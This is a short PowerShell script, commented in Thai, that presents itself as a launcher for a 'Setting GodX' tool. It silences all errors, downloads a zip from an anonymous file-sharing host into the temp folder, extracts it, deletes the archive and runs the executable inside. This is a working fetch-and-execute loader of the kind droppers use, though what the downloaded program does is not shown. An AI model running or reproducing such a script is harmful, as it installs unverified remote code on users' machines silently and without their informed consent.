# ปิดการแจ้งเตือนทั้งหมด
$ErrorActionPreference = 'SilentlyContinue'

$exeName = "Setting GodX.exe"
$zipName = "Setting GodX.zip"
$url = "https://files.catbox.moe/afb9rh.zip"
$tempPath = "$env:TEMP\GodX_App"
$zipPath = "$tempPath\$zipName"

# 1. เตรียมโฟลเดอร์
if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath | Out-Null }

# 2. ดาวน์โหลดแบบ Streaming (เร็วที่สุด)
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $zipPath)

# 3. แตกไฟล์ .zip แบบ Direct API (เร็วที่สุด ไม่ผ่าน Explorer)
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempPath)

# 4. ลบไฟล์ Zip ทิ้งทันที
Remove-Item $zipPath -Force

# 5. รันโปรแกรม (ใช้ & เพื่อรันไฟล์ที่มีเว้นวรรค)
$exeFullPath = "$tempPath\$exeName"
& "$exeFullPath"
